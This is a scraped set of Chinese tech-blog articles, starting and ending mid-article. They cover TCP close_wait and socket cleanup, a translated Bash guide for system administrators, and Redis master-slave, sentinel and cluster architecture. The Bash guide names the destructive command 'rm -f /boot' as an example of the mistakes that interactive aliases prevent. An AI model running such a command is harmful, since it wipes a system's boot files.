,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上述代码就是被动关闭端的后两次挥手了,如下图所示:,\n,\n,出现大量close_wait的情况,\n,linux中出现大量close_wait的情况一般是应用在检测到对端fin时没有及时close当前连接。有一种可能如下图所示: ,\n当出现这种情况，通常是minIdle之类参数的配置不对(如果连接池有定时收缩连接功能的话)。给连接池加上心跳也可以解决这种问题。,\n如果应用close的时间过晚，对端已经将连接给销毁。则应用发送给fin给对端，对端会由于找不到对应的连接而发送一个RST(Reset)报文。,\n,操作系统何时回收close_wait,\n,如果应用迟迟没有调用close_wait,那么操作系统有没有一个回收机制呢，答案是有的。 tcp本身有一个包活(keep alive)定时器，在(keep alive)定时器超时之后，会强行将此连接关闭。可以设置tcp keep alive的时间,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/etc/sysctl.conf\r\nnet.ipv4.tcp_keepalive_intvl = 75\r\nnet.ipv4.tcp_keepalive_probes = 9\r\nnet.ipv4.tcp_keepalive_time = 7200  \r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/,etc,/,sysctl,.,conf,net,.,ipv4,.,tcp_keepalive_intvl, ,=, ,75,net,.,ipv4,.,tcp_keepalive_probes, ,=, ,9,net,.,ipv4,.,tcp_keepalive_time, ,=, ,7200,  , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,默认值如上面所示，设置的很大，7200s后超时，如果想快速回收close_wait可以设置小一点。但最终解决方案还是得从应用程序着手。,\n关于tcp keepalive包活定时器可见笔者另一篇博客:,\n,https://my.oschina.net/alchemystar/blog/833981,\n,进程关闭时清理socket资源,\n,进程在退出时候(无论kill,kill -9 或是正常退出)都会关闭当前进程中所有的fd(文件描述符),\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndo_exit\r\n\t|-exit_files\r\n\t\t|-__exit_files\r\n\t\t\t|-close_files\r\n\t\t\t\t\t|-filp_close\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,do_exit,\t,|,-,exit_files,\t\t,|,-,__exit_files,\t\t\t,|,-,close_files,\t\t\t\t\t,|,-,filp,_,close, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样我们又回到了博客伊始的filp_close函数，对每一个是socket的fd发送send_fin,\n,Java GC时清理socket资源,\n,Java的socket最终关联到AbstractPlainSocketImpl,且其重写了object的finalize方法,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nabstract class AbstractPlainSocketImpl extends SocketImpl \r\n{\r\n\t......\r\n    /**\r\n     * Cleans up if the user forgets to close it.\r\n     */\r\n    protected void finalize() throws IOException {\r\n        close()\r\n    }\r\n    ......\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,abstract, ,class, ,AbstractPlainSocketImpl, ,extends, ,SocketImpl, ,{,\t,.,.,.,.,.,.,    ,/**,     * Cleans up if the user forgets to close it.,     */,    ,protected, ,void, ,finalize,(,), ,throws, ,IOException, ,{,        ,close,(,),    ,},    ,.,.,.,.,.,.,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,所以Java会在GC时刻会关闭没有被引用的socket,但是切记不要寄希望于Java的GC,因为GC时刻并不是以未引用的socket数量来判断的，所以有可能泄露了一堆socket,但仍旧没有触发GC。,\n,总结,\n,linux内核源代码博大精深，阅读其代码很费周折。之前读《TCP/IP详解卷二》的时候由于有先辈引导和梳理，所以看书中所使用的BSD源码并不觉得十分费劲。直到现在自己带着问题独立看linux源码的时候，尽管有之前的基础，仍旧被其中的各种细节所迷惑。希望笔者这篇文章能帮助到阅读linux网络协议栈代码的人。,\n,\n,\n, ,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114276/", "url_object_id": "2f3d9b3bdf956b9f6b37c1e046ec7931", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/1150173c490f522abf51bb0af9fc028d.jpg"], "title": "面向系统管理员的 Bash 指南", "create_time": "2018/08/19", "vote": "2", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Maxim Burgerhout,   译文出处：,Linux中国/Liang Chen,   ,使 Bash 工作的更好的技巧。,\n,\n,每个行业都有一个该行业的大师们最常使用的工具。 对于许多系统管理员来说，这个工具就是他们的 ,shell,。 在大多数 Linux 和其他类 Unix 系统上，默认的 shell 是 Bash。,\n,Bash 是一个相当古老的程序——它起源于 20 世纪 80 年代后期——但它建立在更多更老的 shell 上，比如 C shell（csh），csh 至少是它 10 年前的前辈了。 因为 shell 的概念是那么古老，所以有大量的神秘知识等待着系统管理员去吸收领悟，使其生活更轻松。,\n,我们来看看一些基础知识。,\n,在某些时候，谁曾经无意中以 root 身份运行命令并导致某种问题？ ,举手,\n,我很确定我们很多人一度都是那个人。 这很痛苦。 这里有一些非常简单的技巧可以防止你再次碰上这类问题。,\n,使用别名,\n,首先，为 ,mv, 和 ,rm, 等命令设置别名，指向 ,mv -i, 和 ,rm -i,。 这将确保在运行 ,rm -f /boot, 时至少需要你确认。 在 Red Hat 企业版 Linux 中，如果你使用 root 帐户，则默认设置这些别名。,\n,如果你还要为普通用户帐户设置这些别名，只需将这两行放入家目录下名为 ,.bashrc, 的文件中（这些也适用于 ,sudo, ）：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias mv='mv -i'\r\nalias rm='rm -i',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,mv,=,'mv -i',alias ,rm,=,'rm -i',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,让你的 root 提示符脱颖而出,\n,你可以采取的防止意外发生的另一项措施是确保你很清楚在使用 root 帐户。 在日常工作中，我通常会让 root 提示符从日常使用的提示符中脱颖而出。,\n,如果将以下内容放入 root 的家目录中的 ,.bashrc, 文件中，你将看到一个黑色背景上的红色的 root 提示符，清楚地表明你（或其他任何人）应该谨慎行事。,\n,export PS1=”,\\[$(tput bold)$(tput setab 0)$(tput setaf 1)\\],\\u@\\h:\\w # ,\\[$(tput sgr0)\\],”,\n,实际上，你应该尽可能避免以 root 用户身份登录，而是通过 ,sudo, 运行大多数系统管理命令，但这是另一回事。,\n,使用了一些小技巧用于防止使用 root 帐户时的“不小心的副作用”之后，让我们看看 Bash 可以帮助你在日常工作中做的一些好事。,\n,控制你的历史,\n,你可能知道在 Bash 中你按向上的箭头时能看见和重新使用你之前所有（好吧，大多数）的命令。这是因为这些命令已经保存到了你家目录下的名为 ,.bash_history, 的文件中。这个历史文件附带了一组有用的设置和命令。,\n,首先，你可以通过键入 ,history, 来查看整个最近的命令历史记录，或者你可以通过键入 ,history 30, 将其限制为最近 30 个命令。不过这技巧太平淡无奇了（LCTT 译注： vanilla 原为香草，后引申没拓展的、标准、普通的，比如 vanilla C++ compiler 意为标准 C++ 编译器）。 你可以更好地控制 Bash 保存的内容以及保存方式。,\n,例如，如果将以下内容添加到 ,.bashrc,，那么任何以空格开头的命令都不会保存到历史记录列表中：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nHISTCONTROL=ignorespace,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,HISTCONTROL,=,ignorespace,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你需要以明文形式将密码传递给一个命令，这就非常有用。 （是的，这太可怕了，但它仍然会发生。）,\n,如果你不希望经常执行的命令充斥在历史记录中，请使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nHISTCONTROL=ignorespace:erasedups,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,HISTCONTROL,=,ignorespace,:,erasedups,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样，每次使用一个命令时，都会从历史记录文件中删除之前出现的所有相同命令，并且只将最后一次调用保存到历史记录列表中。,\n,我特别喜欢的历史记录设置是 ,HISTTIMEFORMAT, 设置。 这将在历史记录文件中在所有的条目前面添加上时间戳。 例如，我使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nHISTTIMEFORMAT=\"%F %T  \",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,HISTTIMEFORMAT,=,\"%F %T  \",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当我输入 ,history 5, 时，我得到了很好的完整信息，如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n1009  2018-06-11 22:34:38  cat /etc/hosts\r\n1010  2018-06-11 22:34:40  echo $foo\r\n1011  2018-06-11 22:34:42  echo $bar\r\n1012  2018-06-11 22:34:44  ssh myhost\r\n1013  2018-06-11 22:34:55  vim .bashrc,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,1009, , ,2018,-,06,-,11, ,22,:,34,:,38, , ,cat, ,/,etc,/,hosts,1010, , ,2018,-,06,-,11, ,22,:,34,:,40, , ,echo, ,$,foo,1011, , ,2018,-,06,-,11, ,22,:,34,:,42, , ,echo, ,$,bar,1012, , ,2018,-,06,-,11, ,22,:,34,:,44, , ,ssh ,myhost,1013, , ,2018,-,06,-,11, ,22,:,34,:,55, , ,vim, ,.,bashrc,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这使我更容易浏览我的命令历史记录并找到我两天前用来建立到我家实验室的 SSH 连接（我一次又一次地忘记……）。,\n,Bash 最佳实践,\n,我将在编写 Bash 脚本时最好的（或者至少是好的，我不要求无所不知）11 项实践列出来。,\n,11、 Bash 脚本可能变得复杂，不过注释也很方便。 如果你在考虑是否要添加注释，那就添加一个注释。 如果你在周末之后回来并且不得不花时间搞清楚你上周五想要做什么，那你是忘了添加注释。,\n,10、 用花括号括起所有变量名，比如 ,${myvariable},。 养成这个习惯可以使用 ,${variable}_suffix, 这种用法了，还能提高整个脚本的一致性。,\n,9、 计算表达式时不要使用反引号；请改用 ,$(), 语法。 所以使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfor  file in $(ls); do,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,for, , ,file ,in, ,$,(,ls,),;, ,do,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,而不使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfor  file in `ls`; do,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,for, , ,file ,in, ,`,ls,`,;, ,do,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,前一个方式是可嵌套的，更易于阅读的，还能让一般的系统管理员群体感到满意。 不要使用反引号。,\n,8、 一致性是好的。 选择一种风格并在整个脚本中坚持下去。 显然，我喜欢人们选择 ,$(), 语法而不是反引号，并将其变量包在花括号中。 我更喜欢人们使用两个或四个空格而不是制表符来缩进，但即使你选择了错误的方式，也要一贯地错下去。,\n,7、 为 Bash 脚本使用适当的,释伴,shebang（LCTT 译注：,Shebang,，也称为 ,Hashbang, ，是一个由井号和叹号构成的字符序列 ,#!, ，其出现在文本文件的第一行的前两个字符。 在文件中存在释伴的情况下，类 Unix 操作系统的程序载入器会分析释伴后的内容，将这些内容作为解释器指令，并调用该指令，并将载有释伴的文件路径作为该解释器的参数）。 因为我正在编写Bash脚本，只打算用 Bash 执行它们，所以我经常使用 ,#!/usr/bin/bash, 作为我的释伴。 不要使用 ,#!/bin/sh, 或 ,#!/usr/bin/sh,。 你的脚本会被执行，但它会以兼容模式运行——可能会产生许多意外的副作用。 （当然，除非你想要兼容模式。）,\n,6、 比较字符串时，在 ,if, 语句中给变量加上引号是个好主意，因为如果你的变量是空的，Bash 会为这样的行抛出一个错误：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif [ ${myvar} == \"foo\" ]; then\r\n  echo \"bar\"\r\nfi,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if, ,[, ,$,{,myvar,}, ,==, ,\"foo\", ,],;, ,then,  ,echo, ,\"bar\",fi,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于这样的行，将判定为 ,false,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif [ \"${myvar}\" == \"foo\" ]; then\r\n  echo \"bar\"\r\nfi,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if, ,[, ,\"${myvar}\", ,==, ,\"foo\", ,],;, ,then,  ,echo, ,\"bar\",fi,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此外，如果你不确定变量的内容（例如，在解析用户输入时），请给变量加引号以防止解释某些特殊字符，并确保该变量被视为单个单词，即使它包含空格。,\n,5、 我想这是一个品味问题，但我更喜欢使用双等号（ ,==, ），即使是比较 Bash 中的字符串。 这是一致性的问题，尽管对于字符串比较，只有一个等号会起作用，我的思维立即变为“单个 ,=, 是一个赋值运算符！”,\n,4、 使用适当的退出代码。 确保如果你的脚本无法执行某些操作，则会向用户显示已写好的失败消息（最好提供解决问题的方法）并发送非零退出代码：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# we have failed\r\necho \"Process has failed to complete, you need to manually restart the whatchamacallit\"\r\nexit 1,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# we have failed,echo, ,\"Process has failed to complete, you need to manually restart the whatchamacallit\",exit, ,1,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样可以更容易地以编程方式从另一个脚本调用你的脚本并验证其成功完成。,\n,3、 使用 Bash 的内置机制为变量提供合理的默认值，或者如果未定义你希望定义的变量，则抛出错误：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# this sets the value of $myvar to redhat, and prints 'redhat'\r\necho ${myvar:=redhat},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# this sets the value of $myvar to redhat, and prints 'redhat',echo, ,$,{,myvar,:,=,redhat,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# this throws an error reading 'The variable myvar is undefined, dear reader' if $myvar is undefined\r\n${myvar:?The variable myvar is undefined, dear reader},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# this throws an error reading 'The variable myvar is undefined, dear reader' if $myvar is undefined,$,{,myvar,:,?,The ,variable ,myvar ,is, ,undefined,,, ,dear ,reader,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,2、 特别是如果你正在编写大型脚本，或者是如果你与其他人一起开发该大型脚本，请考虑在函数内部定义变量时使用 ,local, 关键字。 ,local, 关键字将创建一个局部变量，该变量只在该函数中可见。 这限制了变量冲突的可能性。,\n,1、 每个系统管理员有时必须这样做：在控制台上调试一些东西，可能是数据中心的真实服务器，也可能是虚拟化平台的虚拟服务器。 如果你必须以这种方式调试脚本，你会感谢你自己记住了这个：不要让你的脚本中的行太长！,\n,在许多系统上，控制台的默认宽度仍为 80 个字符。 如果你需要在控制台上调试脚本并且该脚本有很长的行，那么你将成为一个悲伤的熊猫。 此外，具有较短行的脚本—— 默认值仍为 80 个字符——在普通编辑器中也更容易阅读和理解！,\n,我真的很喜欢 Bash。 我可以花几个小时写这篇文章或与其他爱好者交流优秀的技巧。 就希望你们能在评论中留下赞美。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114280/", "url_object_id": "153f790f7e03f236b0dc87810b3dc52f", "front_image_path": "full/11683e584e6ecc31d0566e0bd45230c6d558da23.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "Redis 架构演变与 Redis-cluster 群集读写方案", "create_time": "2018/08/14", "vote": "2", "bookmark": "3", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,PingLee,   ,导言,\n,Redis-cluster 是近年来 Redis 架构不断改进中的相对较好的 Redis 高可用方案。本文涉及到近年来 Redis 多实例架构的演变过程，包括普通主从架构（Master、slave 可进行写读分离）、哨兵模式下的主从架构、Redis-cluster 高可用架构（Redis 官方默认 cluster 下不进行读写分离）的简介。同时还介绍使用Java的两大redis客户端：Jedis与Lettuce用于读写redis-cluster的数据的一般方法。再通过官方文档以及互联网的相关技术文档，给出redis-cluster架构下的读写能力的优化方案，包括官方的推荐的扩展redis-cluster下的Master数量以及非官方默认的redis-cluster的读写分离方案，案例中使用Lettuce的特定方法进行redis-cluster架构下的数据读写分离。,\n, ,\n,近年来redis多实例用架构的演变过程,\n,redis是基于内存的高性能key-value数据库，若要让redis的数据更稳定安全，需要引入多实例以及相关的高可用架构。而近年来redis的高可用架构亦不断改进，先后出现了本地持久化、主从备份、哨兵模式、redis-cluster群集高可用架构等等方案。,\n, ,\n,1、redis普通主从模式,\n,通过持久化功能，Redis保证了即使在服务器重启的情况下也不会损失（或少量损失）数据，因为持久化会把内存中数据保存到硬盘上，重启会从硬盘上加载数据。 。但是由于数据是存储在一台服务器上的，如果这台服务器出现硬盘故障等问题，也会导致数据丢失。为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。为此， Redis 提供了复制（replication）功能，可以实现当一台数据库中的数据更新后，自动将更新的数据同步到其他数据库上。,\n,在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库（slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。,\n,\n,主从模式的配置，一般只需要再作为slave的redis节点的conf文件上加入“slaveof master,ip master,port”， 或者作为slave的redis节点启动时使用如下参考命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nredis-server --port 6380 --slaveof masterIp masterPort   ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,redis,-,server, ,--,port, ,6380, ,--,slaveof ,masterIp ,masterPort,   ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,redis的普通主从模式，能较好地避免单独故障问题，以及提出了读写分离，降低了Master节点的压力。互联网上大多数的对redis读写分离的教程，都是基于这一模式或架构下进行的。但实际上这一架构并非是目前最好的redis高可用架构。,\n, ,\n,2、redis哨兵模式高可用架构,\n,当主数据库遇到异常中断服务后，开发者可以通过手动的方式选择一个从数据库来升格为主数据库，以使得系统能够继续提供服务。然而整个过程相对麻烦且需要人工介入，难以实现自动化。 为此，Redis 2.8开始提供了哨兵工具来实现自动化的系统监控和故障恢复功能。 哨兵的作用就是监控redis主、从数据库是否正常运行，主出现故障自动将从数据库转换为主数据库。,\n,顾名思义，哨兵的作用就是监控Redis系统的运行状况。它的功能包括以下两个。,\n,（1）监控主数据库和从数据库是否正常运行。,\n（2）主数据库出现故障时自动将从数据库转换为主数据库。,\n,\n,可以用info replication查看主从情况 例子： 1主2从 1哨兵,可以用命令起也可以用配置文件里 可以使用双哨兵，更安全，参考命令如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nredis-server --port 6379 \r\nredis-server --port 6380 --slaveof 192.168.0.167 6379 \r\nredis-server --port 6381 --slaveof 192.168.0.167 6379\r\nredis-sentinel sentinel.conf ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,redis,-,server, ,--,port, ,6379, ,redis,-,server, ,--,port, ,6380, ,--,slaveof, ,192.168.0.167, ,6379, ,redis,-,server, ,--,port, ,6381, ,--,slaveof, ,192.168.0.167, ,6379,redis,-,sentinel ,sentinel,.,conf, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中，哨兵配置文件sentinel.conf参考如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsentinel monitor mymaster 192.168.0.167 6379 1  ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sentinel ,monitor ,mymaster, ,192.168.0.167, ,6379, ,1,  ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中mymaster表示要监控的主数据库的名字。配置哨兵监控一个系统时，只需要配置其监控主数据库即可，哨兵会自动发现所有复制该主数据库的从数据库。,\nMaster与slave的切换过程：,\n（1）slave leader升级为master,\n（2）其他slave修改为新master的slave,\n（3）客户端修改连接,\n（4）老的master如果重启成功，变为新master的slave,\n, ,\n,3、redis-cluster群集高可用架构,\n,即使使用哨兵，redis每个实例也是全量存储，每个redis存储的内容都是完整的数据，浪费内存且有木桶效应。为了最大化利用内存，可以采用cluster群集，就是分布式存储。即每台redis存储不同的内容。,\n采用redis-cluster架构正是满足这种分布式存储要求的集群的一种体现。redis-cluster架构中，被设计成共有16384个hash slot。每个master分得一部分slot，其算法为：hash_slot = crc16(key) mod 16384 ，这就找到对应slot。采用hash slot的算法，实际上是解决了redis-cluster架构下，有多个master节点的时候，数据如何分布到这些节点上去。key是可用key，如果有{}则取{}内的作为可用key，否则整个可以是可用key。群集至少需要3主3从，且每个实例使用不同的配置文件。,\n,\n,在redis-cluster架构中，redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。,\n,在redis的官方文档中，对redis-cluster架构上，有这样的说明：在cluster架构下，默认的，一般redis-master用于接收读写，而redis-slave则用于备份，当有请求是在向slave发起时，会直接重定向到对应key所在的master来处理。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离,。具体可以参阅redis官方文档（https://redis.io/commands/readonly）等相关内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nEnables read queries for a connection to a Redis Cluster slave node.    \r\nNormally slave nodes will redirect clients to the authoritative master for the hash slot involved in a given command, however clients can use slaves in order to scale reads using the READONLY command.    \r\nREADONLY tells a Redis Cluster slave node that the client is willing to read possibly stale data and is not interested in running write queries.    \r\nWhen the connection is in readonly mode, the cluster will send a redirection to the client only if the operation involves keys not served by the slave's master node. This may happen because:  \r\nThe client sent a command about hash slots never served by the master of this slave.\r\nThe cluster was reconfigured (for example resharded) and the slave is no longer able to serve commands for a given hash slot.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Enables ,read ,queries ,for, ,a, ,connection ,to, ,a, ,Redis ,Cluster ,slave ,node,.,    ,Normally ,slave ,nodes ,will ,redirect ,clients ,to, ,the ,authoritative ,master ,for, ,the ,hash ,slot ,involved ,in, ,a, ,given ,command,,, ,however ,clients ,can ,use, ,slaves ,in, ,order ,to, ,scale ,reads ,using ,the ,READONLY ,command,.,    ,READONLY ,tells, ,a, ,Redis ,Cluster ,slave ,node ,that ,the ,client ,is, ,willing ,to, ,read ,possibly ,stale ,data ,and, ,is, ,not, ,interested ,in, ,running ,write ,queries,.,    ,When ,the ,connection ,is, ,in, ,readonly ,mode,,, ,the ,cluster ,will ,send, ,a, ,redirection ,to, ,the ,client ,only ,if, ,the ,operation ,involves ,keys ,not, ,served ,by ,the ,slave,',s, ,master ,node,., ,This, ,may ,happen ,because,:,  ,The ,client ,sent, ,a, ,command ,about ,hash ,slots ,never ,served ,by ,the ,master ,of ,this, ,slave,.,The ,cluster ,was ,reconfigured, ,(,for, ,example ,resharded,), ,and, ,the ,slave ,is, ,no ,longer ,able ,to, ,serve ,commands ,for, ,a, ,given ,hash ,slot,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,例如，我们假设已经建立了一个三主三从的redis-cluster架构，其中A、B、C节点都是redis-master节点，A1、B1、C1节点都是对应的redis-slave节点。在我们只有master节点A，B，C的情况下，对应redis-cluster如果节点B失败，则群集无法继续，因为我们没有办法再在节点B的所具有的约三分之一的hash slot集合范围内提供相对应的slot。然而，如果我们为每个主服务器节点添加一个从服务器节点，以便最终集群由作为主服务器节点的A，B，C以及作为从服务器节点的A1，B1，C1组成，那么如果节点B发生故障，系统能够继续运行。节点B1复制B，并且B失效时，则redis-cluster将促使B的从节点B1作为新的主服务器节点并且将继续正确地操作。但请注意，如果节点B和B1在同一时间发生故障，则Redis群集无法继续运行。,\n,Redis群集配置参数:在继续之前，让我们介绍一下Redis 